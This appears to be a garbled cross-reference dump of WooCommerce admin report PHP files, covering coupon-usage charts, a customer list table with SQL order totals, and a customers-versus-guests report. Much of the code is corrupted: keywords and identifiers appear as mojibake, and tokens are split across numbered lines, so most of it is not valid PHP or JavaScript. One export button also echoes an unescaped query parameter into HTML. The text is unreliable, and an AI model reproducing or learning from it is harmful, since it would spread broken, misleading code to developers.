	`jQu”y
('.£ùiÚ_t™Ë:eq(0)').
	`şick
();

304 <?
php
 
’dif
; ?>

306 </
süt
>

307 <?
php


308 
	}
}

313 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

314 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

316 <
a


317 
h»f
="#"

318 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

319 
şass
="export_csv"

320 
d©a
-
expÜt
="chart"

321 
d©a
-
xaxes
="<?php _e( 'Date', 'woocommerce' ); ?>"

322 
d©a
-
groupby
="<?phpƒcho $this->chart_groupby; ?>"

324 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

325 </
a
>

326 <?
php


327 
	}
}

333 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

334 
glob®
 
$wp_loÿË
;

337 
$Üd”_coupÚ_couÁs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

338 'd©a' => 
	`¬¿y
(

339 'Üd”_™em_Çme' => 
	`¬¿y
(

345 'po¡_d©e' => 
	`¬¿y
(

351 'wh”e' => 
	`¬¿y
(

352 
	`¬¿y
(

355 'v®ue' => 
$this
->
coupÚ_codes
,

359 'group_by' => 
$this
->
group_by_qu”y
,

362 'f‹r_¿nge' => 
Œue


365 
$Üd”_discouÁ_amouÁs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

366 'd©a' => 
	`¬¿y
(

367 'discouÁ_amouÁ' => 
	`¬¿y
(

373 'po¡_d©e' => 
	`¬¿y
(

379 'wh”e' => 
	`¬¿y
(

380 
	`¬¿y
(

383 'v®ue' => 
$this
->
coupÚ_codes
,

387 'group_by' => 
$this
->
group_by_qu”y
 . ', order_item_name',

390 'f‹r_¿nge' => 
Œue


394 
$Üd”_coupÚ_couÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$Üd”_coupÚ_couÁs, 'po¡_d©e', 'Üd”_coupÚ_couÁ' , $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

395 
$Üd”_discouÁ_amouÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$Üd”_discouÁ_amouÁs, 'po¡_d©e', 'discouÁ_amouÁ', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

398 
$ch¬t_d©a
 = 
	`jsÚ_’code
Ğ
	`¬¿y
(

399 'Üd”_coupÚ_couÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_coupÚ_couÁs
 ),

400 'Üd”_discouÁ_amouÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_discouÁ_amouÁs
 )

403 <
div
 
şass
="chart-container">

404 <
div
 
şass
="chart-placeholder main"></div>

405 </
div
>

406 <
süt
 
ty³
="text/javascript">

407 
v¬
 
maš_ch¬t
;

409 
	`jQu”y
(
	`funùiÚ
(){

410 
v¬
 
Üd”_d©a
 = 
jQu”y
.
	`·r£JSON
( '<?phpƒcho $chart_data; ?>' );

412 
v¬
 
d¿wG¿ph
 = 
	`funùiÚ
Ğ
highlight
 ) {

413 
v¬
 
£r›s
 = [

415 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Number of coupons used', 'woocommerce' ) ) ?>",

416 
d©a
: 
Üd”_d©a
.
Üd”_coupÚ_couÁs
,

417 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
coupÚ_couÁ
' ]; ?>',

418 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
coupÚ_couÁ
' ]; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

419 
shadowSize
: 0,

420 
hov”abË
: 
çl£


423 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Discount‡mount', 'woocommerce' ) ) ?>",

424 
d©a
: 
Üd”_d©a
.
Üd”_discouÁ_amouÁs
,

425 
yaxis
: 2,

426 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
discouÁ_amouÁ
']; ?>',

427 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

428 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

429 
shadowSize
: 0,

430 
´•’d_toŞt
: "<?phpƒcho get_woocommerce_currency_symbol(); ?>"

434 iàĞ
highlight
 !=ğ'undefšed' && 
£r›s
[ highlight ] ) {

435 
highlight_£r›s
 = 
£r›s
[ 
highlight
 ];

437 
highlight_£r›s
.
cŞÜ
 = '#9c5d90';

439 iàĞ
highlight_£r›s
.
b¬s
 )

440 
highlight_£r›s
.
b¬s
.
flCŞÜ
 = '#9c5d90';

442 iàĞ
highlight_£r›s
.
lšes
 ) {

443 
highlight_£r›s
.
lšes
.
lšeWidth
 = 5;

447 
maš_ch¬t
 = 
jQu”y
.
	`¶Ù
(

448 
	`jQu”y
('.chart-placeholder.main'),

449 
£r›s
,

451 
Ëg’d
: {

452 
show
: 
çl£


454 
grid
: {

455 
cŞÜ
: '#aaa',

456 
bÜd”CŞÜ
: 'transparent',

457 
bÜd”Width
: 0,

458 
hov”abË
: 
Œue


460 
xaxes
: [ {

461 
cŞÜ
: '#aaa',

462 
pos™iÚ
: "bottom",

463 
tickCŞÜ
: 'transparent',

464 
mode
: "time",

465 
timefÜm©
: "<?php if ( $this->chart_groupby == 'day' )ƒcho '%d %b';ƒlseƒcho '%b'; ?>",

466 
mÚthNames
: <?
php
 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y_v®ues
Ğ
$wp_loÿË
->
mÚth_abb»v
 ) ) ?>,

467 
tickL’gth
: 1,

468 
mšTickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

469 
fÚt
: {

470 
cŞÜ
: "#aaa"

473 
yaxes
: [

475 
mš
: 0,

476 
mšTickSize
: 1,

477 
tickDecim®s
: 0,

478 
cŞÜ
: '#ecf0f1',

479 
fÚt
: { 
cŞÜ
: "#aaa" }

482 
pos™iÚ
: "right",

483 
mš
: 0,

484 
tickDecim®s
: 2,

485 
®ignTicksW™hAxis
: 1,

486 
cŞÜ
: 'transparent',

487 
fÚt
: { 
cŞÜ
: "#aaa" }

493 
	`jQu”y
('.ch¬t-¶aûhŞd”').
	`»size
();

496 
	`d¿wG¿ph
();

498 
	`jQu”y
('.highlight_£r›s').
	`hov”
(

499 
	`funùiÚ
() {

500 
	`d¿wG¿ph
Ğ
	`jQu”y
(
this
).
	`d©a
('series') );

502 
	`funùiÚ
() {

503 
	`d¿wG¿ph
();

507 </
süt
>

508 <?
php


509 
	}
}

	@includes/admin/reports/class-wc-report-customer-list.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) ) {

3 
	gex™
;

6 iàĞ! 
şass_exi¡s
( 'WP_List_Table' ) ) {

7 
»quœe_Úû
Ğ
ABSPATH
 . 'wp-admin/includes/class-wp-list-table.php' );

18 şas 
	cWC_R•Üt_Cu¡om”_Li¡
 
ex‹nds
 
	mWP_Li¡_TabË
 {

25 
funùiÚ
 
	$__cÚ¡ruù
(){

26 
glob®
 
$¡©us
, 
$·ge
;

28 
·»Á
::
	`__cÚ¡ruù
Ğ
	`¬¿y
(

29 'sšguÏr' => 
	`__
( 'Customer', 'woocommerce' ),

30 '¶u¿l' => 
	`__
( 'Customers', 'woocommerce' ),

31 'ajax' => 
çl£


38 
public
 
funùiÚ
 
	$no_™ems
() {

39 
	`_e
( 'No customers found.', 'woocommerce' );

40 
	}
}

45 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

46 
$this
->
	`´•¬e_™ems
();

48 
echo
 '<div id="poststuff" class="woocommerce-reports-wide">';

50 iàĞ! 
	`em±y
Ğ
$_GET
['lšk_Üd”s'] ) && 
	`wp_v”ify_nÚû
Ğ
$_REQUEST
['_wpnonce'], 'link_orders' ) ) {

51 
$lšked
 = 
	`wc_upd©e_Ãw_cu¡om”_·¡_Üd”s
Ğ
	`absšt
Ğ
$_GET
['link_orders'] ) );

53 
echo
 '<div cÏss="upd©ed"><p>' . 
	`¥rštf
Ğ
	`_n
Ğ'% ´eviou Üd”†šked', '% ´eviou Üd” lšked', 
$lšked
, 'woocommerce' ), $linked ) . '</p></div>';

56 
echo
 '<form method="post" id="woocommerce_customers">';

58 
$this
->
	`£¬ch_box
Ğ
	`__
( 'Search customers', 'woocommerce' ), 'customer_search' );

59 
$this
->
	`di¥Ïy
();

61 
echo
 '</form>';

62 
echo
 '</div>';

63 
	}
}

73 
funùiÚ
 
	$cŞumn_deçuÉ
Ğ
$u£r
, 
$cŞumn_Çme
 ) {

74 
glob®
 
$wpdb
;

76  
$cŞumn_Çme
 ) {

78 iàĞ
$u£r
->
Ï¡_Çme
 && $u£r->
fœ¡_Çme
 ) {

79  
$u£r
->
Ï¡_Çme
 . ', ' . $u£r->
fœ¡_Çme
;

84  
$u£r
->
u£r_logš
;

88 
$¡©e_code
 = 
	`g‘_u£r_m‘a
Ğ
$u£r
->
ID
, 'blšg_¡©e', 
Œue
 );

89 
$couÁry_code
 = 
	`g‘_u£r_m‘a
Ğ
$u£r
->
ID
, 'blšg_couÁry', 
Œue
 );

91 
$¡©e
 = 
	`is£t
Ğ
	`WC
()->
couÁr›s
->
¡©es
[ 
$couÁry_code
 ][ 
$¡©e_code
 ] ) ? WC()->countries->states[ $country_code ][ $state_code ] : $state_code;

92 
$couÁry
 = 
	`is£t
Ğ
	`WC
()->
couÁr›s
->couÁr›s[ 
$couÁry_code
 ] ) ? WC()->countries->countries[ $country_code ] : $country_code;

94 
$v®ue
 = '';

96 iàĞ
$¡©e
 ) {

97 
$v®ue
 .ğ
$¡©e
 . ', ';

100 
$v®ue
 .ğ
$couÁry
;

102 iàĞ
$v®ue
 ) {

103  
$v®ue
;

109  '<¨h»f="mato:' . 
$u£r
->
u£r_ema
 . '">' . $user->user_email . '</a>';

111 iàĞ! 
$¥’t
 = 
	`g‘_u£r_m‘a
Ğ
$u£r
->
ID
, '_mÚey_¥’t', 
Œue
 ) ) {

113 
$¥’t
 = 
$wpdb
->
	`g‘_v¬
( "SELECT SUM(meta2.meta_value)

114 
FROM
 
$wpdb
->
po¡s
 
as
…osts

116 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a
 
ON
 
po¡s
.
ID
 = m‘a.
po¡_id


117 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a2
 
ON
 
po¡s
.
ID
 = m‘a2.
po¡_id


118 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


119 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

120 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

122 
WHERE
 
m‘a
.
m‘a_key
 = '_customer_user'

123 
AND
 
m‘a
.
m‘a_v®ue
 = 
$u£r
->
ID


124 
AND
 
po¡s
.
po¡_ty³
 = 'shop_order'

125 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

126 
AND
 
x
.
xÚomy
 = 'shop_order_status'

127 
AND
 
‹rm
.
¦ug
 
	`IN
 ( 'completed' )

128 
AND
 
m‘a2
.
m‘a_key
 = '_order_total'

131 
	`upd©e_u£r_m‘a
Ğ
$u£r
->
ID
, '_mÚey_¥’t', 
$¥’t
 );

134  
	`wc_´iû
Ğ
$¥’t
 );

137 iàĞ! 
$couÁ
 = 
	`g‘_u£r_m‘a
Ğ
$u£r
->
ID
, '_Üd”_couÁ', 
Œue
 ) ) {

139 
$couÁ
 = 
$wpdb
->
	`g‘_v¬
( "SELECT COUNT(*)

140 
FROM
 
$wpdb
->
po¡s
 
as
…osts

142 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a
 
ON
 
po¡s
.
ID
 = m‘a.
po¡_id


143 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


144 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

145 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

147 
WHERE
 
m‘a
.
m‘a_key
 = '_customer_user'

148 
AND
 
po¡s
.
po¡_ty³
 = 'shop_order'

149 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

150 
AND
 
x
.
xÚomy
 = 'shop_order_status'

151 
AND
 
‹rm
.
¦ug
 
	`IN
 ( 'completed' )

152 
AND
 
m‘a_v®ue
 = 
$u£r
->
ID


155 
	`upd©e_u£r_m‘a
Ğ
$u£r
->
ID
, '_Üd”_couÁ', 
$couÁ
 );

158  
	`absšt
Ğ
$couÁ
 );

162 
$Üd”_ids
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

167 'm‘a_qu”y' => 
	`¬¿y
(

168 
	`¬¿y
(

170 'v®ue' => 
$u£r
->
ID


176 iàĞ
$Üd”_ids
 ) {

177 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_ids
[0] );

179 
echo
 '<¨h»f="' . 
	`admš_u¾
Ğ'po¡.php?po¡=' . 
$Üd”
->
id
 . '&aùiÚód™' ) . '">' . $Üd”->
	`g‘_Üd”_numb”
(è. '</a> &ndash; ' . 
	`d©e_i18n
Ğ
	`g‘_İtiÚ
Ğ'd©e_fÜm©' ), 
	`¡¹Ùime
Ğ$Üd”->
Üd”_d©e
 ) );

180 } 
echo
 '-';

184 ?><
p
>

185 <?
php


186 
	`do_aùiÚ
Ğ'woocomm”û_admš_u£r_aùiÚs_¡¬t', 
$u£r
 );

188 
$aùiÚs
 = 
	`¬¿y
();

190 
$aùiÚs
['ed™'] = 
	`¬¿y
(

191 'u¾' => 
	`admš_u¾
Ğ'u£r-ed™.php?u£r_id=' . 
$u£r
->
ID
 ),

192 'Çme' => 
	`__
( 'Edit', 'woocommerce' ),

196 
$aùiÚs
['v›w'] = 
	`¬¿y
(

197 'u¾' => 
	`admš_u¾
Ğ'ed™.php?po¡_ty³=shİ_Üd”&_cu¡om”_u£r=' . 
$u£r
->
ID
 ),

198 'Çme' => 
	`__
( 'View orders', 'woocommerce' ),

202 
$Üd”_ids
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

205 'm‘a_qu”y' => 
	`¬¿y
(

206 
	`¬¿y
(

208 'v®ue' => 
	`¬¿y
( 0, '' ),

211 
	`¬¿y
(

213 'v®ue' => 
$u£r
->
u£r_ema


219 iàĞ
$Üd”_ids
 ) {

220 
$aùiÚs
['lšk'] = 
	`¬¿y
(

221 'u¾' => 
	`wp_nÚû_u¾
Ğ
	`add_qu”y_¬g
Ğ'lšk_Üd”s', 
$u£r
->
ID
 ), 'link_orders' ),

222 'Çme' => 
	`__
( 'Link…revious orders', 'woocommerce' ),

227 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_u£r_aùiÚs', $aùiÚs, 
$u£r
 );

229 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$aùiÚ
 ) {

230 
	`´štf
Ğ'<¨şass="bu‰Ú %s" h»f="%s" d©a-t="%s">%s</a>', 
	`esc_©Œ
Ğ
$aùiÚ
['aùiÚ'] ), 
	`esc_u¾
( $action['url'] ),ƒsc_attr( $action['name'] ),ƒsc_attr( $action['name'] ) );

233 
	`do_aùiÚ
Ğ'woocomm”û_admš_u£r_aùiÚs_’d', 
$u£r
 );

235 </
p
><?
php


238 
	}
}

245 
funùiÚ
 
	$g‘_cŞumns
(){

246 
$cŞumns
 = 
	`¬¿y
(

247 'cu¡om”_Çme' => 
	`__
( 'Name (Last, First)', 'woocommerce' ),

248 'u£ºame' => 
	`__
( 'Username', 'woocommerce' ),

249 'ema' => 
	`__
( 'Email', 'woocommerce' ),

250 'loÿtiÚ' => 
	`__
( 'Location', 'woocommerce' ),

251 'Üd”s' => 
	`__
( 'Orders', 'woocommerce' ),

252 '¥’t' => 
	`__
( 'Spent', 'woocommerce' ),

253 'Ï¡_Üd”' => 
	`__
( 'Last order', 'woocommerce' ),

254 'u£r_aùiÚs' => 
	`__
( 'Actions', 'woocommerce' )

257  
$cŞumns
;

258 
	}
}

263 
public
 
funùiÚ
 
	$Üd”_by_Ï¡_Çme
Ğ
$qu”y
 ) {

264 
glob®
 
$wpdb
;

266 
$s
 = ! 
	`em±y
Ğ
$_REQUEST
['s'] ) ? 
	`¡r¦ashes
( $_REQUEST['s'] ) : '';

268 
$qu”y
->
qu”y_äom
 .= " LEFT JOIN {$wpdb->usermeta}‡s meta2 ON ({$wpdb->users}.ID = meta2.user_id) ";

269 
$qu”y
->
qu”y_wh”e
 .= " AND meta2.meta_key = 'last_name' ";

270 
$qu”y
->
qu”y_Üd”by
 = " ORDER BY meta2.meta_value, user_login ASC ";

272 iàĞ
$s
 ) {

273 
$qu”y
->
qu”y_äom
 .= " LEFT JOIN {$wpdb->usermeta}‡s meta3 ON ({$wpdb->users}.ID = meta3.user_id)";

274 
$qu”y
->
qu”y_wh”e
 .ğ" AND ( u£r_logš LIKE '%" . 
	`esc_sql
Ğ
	`¡r_»¶aû
Ğ'*', '', 
$s
 ) ) . "%' OR user_nicename LIKE '%" .ƒsc_sql( str_replace( '*', '', $s ) ) . "%' OR meta3.meta_value LIKE '%" .ƒsc_sql( str_replace( '*', '', $s ) ) . "%' ) ";

275 
$qu”y
->
qu”y_Üd”by
 = " GROUP BY ID " . $query->query_orderby;

278  
$qu”y
;

279 
	}
}

286 
public
 
funùiÚ
 
	$´•¬e_™ems
() {

287 
glob®
 
$wpdb
;

289 
$cu¼’t_·ge
 = 
	`absšt
Ğ
$this
->
	`g‘_·g’um
() );

290 
$³r_·ge
 = 20;

295 
$this
->
_cŞumn_h—d”s
 = 
	`¬¿y
Ğ$this->
	`g‘_cŞumns
(),‡¼ay(), $this->
	`g‘_sÜbË_cŞumns
() );

297 
	`add_aùiÚ
Ğ'´e_u£r_qu”y', 
	`¬¿y
Ğ
$this
, 'order_by_last_name' ) );

302 
$admš_u£rs
 = 
Ãw
 
	`WP_U£r_Qu”y
(

303 
	`¬¿y
(

309 
$mªag”_u£rs
 = 
Ãw
 
	`WP_U£r_Qu”y
(

310 
	`¬¿y
(

316 
$qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
Ğ
	`¬¿y
(

317 'exşude' => 
	`¬¿y_m”ge
Ğ
$admš_u£rs
->
	`g‘_»suÉs
(), 
$mªag”_u£rs
->get_results() ),

318 'numb”' => 
$³r_·ge
,

319 'off£t' => ( 
$cu¼’t_·ge
 - 1 ) * 
$³r_·ge


322 
$this
->
™ems
 = 
$qu”y
->
	`g‘_»suÉs
();

324 
	`»move_aùiÚ
Ğ'´e_u£r_qu”y', 
	`¬¿y
Ğ
$this
, 'order_by_last_name' ) );

329 
$this
->
	`£t_·gš©iÚ_¬gs
Ğ
	`¬¿y
(

330 'tÙ®_™ems' => 
$qu”y
->
tÙ®_u£rs
,

331 '³r_·ge' => 
$³r_·ge
,

332 'tÙ®_·ges' => 
	`û
Ğ
$qu”y
->
tÙ®_u£rs
 / 
$³r_·ge
 )

334 
	}
}

	@includes/admin/reports/class-wc-report-customers.php

1 <?
php


10 şas 
	cWC_R•Üt_Cu¡om”s
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

12 
public
 
	m$ch¬t_cŞours
 = 
¬¿y
();

18 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

19 
$Ëg’d
 = 
	`¬¿y
();

21 
$Ëg’d
[] = 
	`¬¿y
(

22 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% signup šhi ³riod', 'woocomm”û' ), '<¡rÚg>' . Ğ
$this
->
cu¡om”s
 ) . '</strong>' ),

23 'cŞÜ' => 
$this
->
ch¬t_cŞours
['signups'],

27  
$Ëg’d
;

34 
public
 
funùiÚ
 
	$g‘_ch¬t_widg‘s
() {

35 
$widg‘s
 = 
	`¬¿y
();

37 
$widg‘s
[] = 
	`¬¿y
(

39 'ÿÎback' => 
	`¬¿y
Ğ
$this
, 'customers_vs_guests' )

42  
$widg‘s
;

43 
	}
}

49 
public
 
funùiÚ
 
	$cu¡om”s_vs_gue¡s
() {

51 
$cu¡om”_Üd”_tÙ®s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

52 'd©a' => 
	`¬¿y
(

53 'ID' => 
	`¬¿y
(

59 'wh”e_m‘a' => 
	`¬¿y
(

60 
	`¬¿y
(

66 'f‹r_¿nge' => 
Œue


69 
$gue¡_Üd”_tÙ®s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

70 'd©a' => 
	`¬¿y
(

71 'ID' => 
	`¬¿y
(

77 'wh”e_m‘a' => 
	`¬¿y
(

78 
	`¬¿y
(

84 'f‹r_¿nge' => 
Œue


87 <
div
 
şass
="chart-container">

88 <
div
 
şass
="ch¬t-¶aûhŞd” cu¡om”s_vs_gue¡ p›-ch¬t" 
¡yË
="height:200px"></div>

89 <
ul
 
şass
="pie-chart-legend">

90 <
li
 
¡yË
="bÜd”-cŞÜ: <?ph°echØ$this->ch¬t_cŞours['cu¡om”s']; ?>"><?
php
 
	`_e
( 'Customer Sales', 'woocommerce' ); ?></li>

91 <
li
 
¡yË
="bÜd”-cŞÜ: <?ph°echØ$this->ch¬t_cŞours['gue¡s']; ?>"><?
php
 
	`_e
( 'Guest Sales', 'woocommerce' ); ?></li>

92 </
ul
>

93 </
div
>

94 <
süt
 
ty³
="text/javascript">

95 
	`jQu”y
(
	`funùiÚ
(){

96 
jQu”y
.
	`¶Ù
(

97 
	`jQu”y
('.chart-placeholder.customers_vs_guests'),

100 
Ïb–
: '<?ph°_eĞ'
Cu¡om”
 
Ord”s
', '
woocomm”û
' ); ?>',

101 
d©a
: "<?phpƒcho $customer_order_totals->total_orders ?>",

102 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
cu¡om”s
']; ?>'

105 
Ïb–
: '<?ph°_eĞ'
Gue¡
 
Ord”s
', '
woocomm”û
' ); ?>',

106 
d©a
: "<?phpƒcho $guest_order_totals->total_orders ?>",

107 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
gue¡s
']; ?>'

111 
grid
: {

112 
hov”abË
: 
Œue


114 
£r›s
: {

115 
p›
: {

116 
show
: 
Œue
,

117 
¿dius
: 1,

118 
šÃrRadius
: 0.6,

119 
Ïb–
: {

120 
show
: 
çl£


123 
’abË_toŞt
: 
Œue
,

124 
­³nd_toŞt
: "<?phpƒcho ' ' . __( 'orders', 'woocommerce' ); ?>",

126 
Ëg’d
: {

127 
show
: 
çl£


132 
	`jQu”y
('.ch¬t-¶aûhŞd”.cu¡om”s_vs_gue¡s').
	`»size
();

134 </
süt
>

135 <?
php


136 
	}
}

141 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

142 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

144 
$¿nges
 = 
	`¬¿y
(

145 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

146 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

147 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

148 '7day' => 
	`__
( 'Last 7 Days', 'woocommerce' )

151 
$this
->
ch¬t_cŞours
 = 
	`¬¿y
(

157 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

159 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) )

160 
$cu¼’t_¿nge
 = '7day';

162 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

164 
$admš_u£rs
 = 
Ãw
 
	`WP_U£r_Qu”y
(

165 
	`¬¿y
(

171 
$mªag”_u£rs
 = 
Ãw
 
	`WP_U£r_Qu”y
(

172 
	`¬¿y
(

178 
$u£rs_qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
(

179 
	`¬¿y
(

180 'f›lds' => 
	`¬¿y
( 'user_registered' ),

181 'exşude' => 
	`¬¿y_m”ge
Ğ
$admš_u£rs
->
	`g‘_»suÉs
(), 
$mªag”_u£rs
->get_results() )

185 
$this
->
cu¡om”s
 = 
$u£rs_qu”y
->
	`g‘_»suÉs
();

187 
	`fÜ—ch
 ( 
$this
->
cu¡om”s
 
as
 
$key
 => 
$cu¡om”
 ) {

188 iàĞ
	`¡¹Ùime
Ğ
$cu¡om”
->
u£r_»gi¡”ed
 ) < 
$this
->
¡¬t_d©e
 || sŒtÙimeĞ$cu¡om”->u£r_»gi¡”ed ) > $this->
’d_d©e
 )

189 
	`un£t
Ğ
$this
->
cu¡om”s
[ 
$key
 ] );

192 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php' );

193 
	}
}

198 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

199 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

201 <
a


202 
h»f
="#"

203 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

204 
şass
="export_csv"

205 
d©a
-
expÜt
="chart"

206 
d©a
-
xaxes
="<?php _e( 'Date', 'woocommerce' ); ?>"

207 
d©a
-
groupby
="<?phpƒcho $this->chart_groupby; ?>"

209 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

210 </
a
>

211 <?
php


212 
	}
}

218 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

219 
glob®
 
$wp_loÿË
;

221 
$cu¡om”_Üd”s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

222 'd©a' => 
	`¬¿y
(

223 'ID' => 
	`¬¿y
(

228 'po¡_d©e' => 
	`¬¿y
(

234 'wh”e_m‘a' => 
	`¬¿y
(

235 
	`¬¿y
(

241 'group_by' => 
$this
->
group_by_qu”y
,

244 'f‹r_¿nge' => 
Œue


247 
$gue¡_Üd”s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

248 'd©a' => 
	`¬¿y
(

249 'ID' => 
	`¬¿y
(

254 'po¡_d©e' => 
	`¬¿y
(

260 'wh”e_m‘a' => 
	`¬¿y
(

261 
	`¬¿y
(

267 'group_by' => 
$this
->
group_by_qu”y
,

270 'f‹r_¿nge' => 
Œue


273 
$signups
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$this->
cu¡om”s
, 'u£r_»gi¡”ed', '', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

274 
$cu¡om”_Üd”s
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$cu¡om”_Üd”s, 'po¡_d©e', 'tÙ®_Üd”s', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

275 
$gue¡_Üd”s
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$gue¡_Üd”s, 'po¡_d©e', 'tÙ®_Üd”s', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

278 
$ch¬t_d©a
 = 
	`jsÚ_’code
Ğ
	`¬¿y
(

279 'signups' => 
	`¬¿y_v®ues
Ğ
$signups
 ),

280 'cu¡om”_Üd”s' => 
	`¬¿y_v®ues
Ğ
$cu¡om”_Üd”s
 ),

281 'gue¡_Üd”s' => 
	`¬¿y_v®ues
Ğ
$gue¡_Üd”s
 )

284 <
div
 
şass
="chart-container">

285 <
div
 
şass
="chart-placeholder main"></div>

286 </
div
>

287 <
süt
 
ty³
="text/javascript">

288 
v¬
 
maš_ch¬t
;

290 
	`jQu”y
(
	`funùiÚ
(){

291 
v¬
 
ch¬t_d©a
 = 
jQu”y
.
	`·r£JSON
( '<?phpƒcho $chart_data; ?>' );

293 
v¬
 
d¿wG¿ph
 = 
	`funùiÚ
Ğ
highlight
 ) {

294 
v¬
 
£r›s
 = [

296 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Customer Orders', 'woocommerce' ) ) ?>",

297 
d©a
: 
ch¬t_d©a
.
cu¡om”_Üd”s
,

298 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
cu¡om”s
']; ?>',

299 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
cu¡om”s
']; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

300 
shadowSize
: 0,

301 
’abË_toŞt
: 
Œue
,

302 
­³nd_toŞt
: "<?phpƒcho ' ' . __( 'customer orders', 'woocommerce' ); ?>",

303 
¡ack
: 
Œue
,

306 
Ïb–
